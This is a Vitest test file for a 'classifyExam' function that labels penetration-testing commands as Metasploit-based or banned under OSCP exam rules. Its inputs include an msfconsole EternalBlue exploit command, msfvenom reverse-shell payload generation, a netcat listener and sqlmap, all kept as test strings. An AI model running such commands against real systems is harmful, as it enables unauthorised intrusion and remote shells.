import { describe, expect, it } from 'vitest';
import { classifyExam } from '../../../engines/fieldManual/classifyExam';

describe('classifyExam', () => {
  it('classifyExam marks msfconsole use-exploit commands as metasploit', () => {
    expect(classifyExam('msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; run"')).toBe('metasploit');
    expect(classifyExam('use auxiliary/scanner/smb/smb_version')).toBe('metasploit');
    expect(classifyExam('meterpreter > getuid')).toBe('metasploit');
  });

  it('classifyExam marks msfvenom with meterpreter as metasploit', () => {
    expect(classifyExam('msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} -f exe')).toBe('metasploit');
  });

  it('classifyExam leaves a staged handler with no meterpreter unclassified', () => {
    expect(classifyExam('msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe')).toBeUndefined();
    expect(classifyExam('nc -lvnp {LPORT}')).toBeUndefined();
  });

  it('classifyExam bans a prohibited card', () => {
    expect(classifyExam('sqlmap -u x', 'prohibited')).toBe('banned');
  });

  it('classifyExam bans a block whose note says banned or prohibited in the exam', () => {
    expect(classifyExam('x', undefined, 'Banned in the exam.')).toBe('banned');
    expect(classifyExam('x', undefined, 'This is prohibited on the OSCP exam.')).toBe('banned');
    expect(classifyExam('x', 'allowed', 'Often flagged by Defender.')).toBeUndefined();
  });

  it('classifyExam lets banned win over metasploit', () => {
    expect(classifyExam('msfconsole', 'prohibited')).toBe('banned');
  });
});
